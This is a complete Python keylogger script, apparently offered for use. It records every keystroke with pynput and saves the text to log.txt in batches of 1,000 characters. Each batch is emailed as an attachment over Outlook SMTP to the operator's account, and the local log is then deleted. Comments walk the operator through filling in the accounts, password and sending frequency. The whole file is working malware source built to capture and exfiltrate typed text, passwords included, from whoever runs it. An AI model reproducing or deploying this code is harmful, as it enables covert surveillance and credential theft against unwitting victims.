from pynput.keyboard import Key, Listener
import codecs
import os
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

txt_file_path = "log.txt"
def send_email():
    global txt_file_path
    sender = "########@outlook.com" #You need an Outlook account to send e-mail to your main account. 
    receiver = "#######@outlook.com" #This is your main account that you can check keylogger e-mails.
    subject = "Txt file" #You can change this place as you want.
    body = "This email is sent by a keylogger." #You can change this place as you want.
    attachment_path = txt_file_path

    msg = MIMEMultipart()
    msg["From"] = sender
    msg["To"] = receiver
    msg["Subject"] = subject
    msg.attach(MIMEText(body, "plain"))

    attachment = open(attachment_path, "rb")
    part = MIMEBase("application", "octet-stream")
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", f"attachment; filename = {attachment_path}")
    msg.attach(part)

    smtp_server = "smtp-mail.outlook.com" 
    smtp_port = 587
    smtp_usarname = sender
    smtp_password = "########" #You should write your sender Outlook account's password to let the smtplib access.

    with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(smtp_usarname, smtp_password)
        server.sendmail(sender, receiver, msg.as_string())
count = 0
text = ""

#To detect if the capslock on or off.
def on_caps_lock(key):
    global count
    if key == Key.caps_lock:
        count += 1
    if count % 2 == 1:
        return True
    else:
        return False      

def on_press(key):
    global text, txt_file_path
    try:
        if key == Key.space:
            text += " "
        elif key == Key.backspace:
            text = text[:-1]
        if on_caps_lock(key):
            text += key.char.upper()
        else:
            text += key.char            
    except AttributeError:
        pass
    
    if len(text) >= 1000: #You can set the e-mail frequency with changing the lenght of the txt content.
        with codecs.open(txt_file_path, "w", "utf-8") as file:
            file.write(text)
            text = ""
        send_email()
        if os.path.exists(txt_file_path):
            os.remove(txt_file_path)

with Listener(on_press=on_press) as listener: 
    listener.join()
